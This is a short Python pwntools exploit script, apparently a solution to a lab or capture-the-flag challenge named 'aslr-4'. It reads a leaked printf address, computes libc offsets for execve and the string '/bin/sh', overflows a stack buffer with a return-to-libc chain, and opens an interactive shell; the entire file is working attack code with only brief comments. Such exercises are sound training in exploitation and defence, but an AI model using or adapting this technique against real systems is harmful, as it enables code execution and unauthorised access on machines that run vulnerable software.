#!/usr/bin/env python
from pwn import *

p=process('./aslr-4')
# Use gdb ./aslr-4 to get "print execve", "print printf"
# Use gdb ./system to get "search "/bin/sh""
# exe_addr - printf_addr
# "bin/sh"_addr - prinft_addr
offset_of_execve = 0xb7eb87e0 - 0xb7e51670
offset_of_sh = 0xb7f63a0b  - 0xb7e51670
print hex(offset_of_execve)
print hex(offset_of_sh)

line_with_address = p.recvline()
print line_with_address
address_of_printf = int(line_with_address.split(' ')[-1], 16)
print hex(address_of_printf)

address_of_execve = address_of_printf + offset_of_execve
address_of_sh     = address_of_printf + offset_of_sh

buffer = "A" * 0x88 + "AAAA" + p32(address_of_execve) + "BBBB" + p32(address_of_sh) + p32(0) + p32(0)

p.sendline(buffer)

p.interactive()
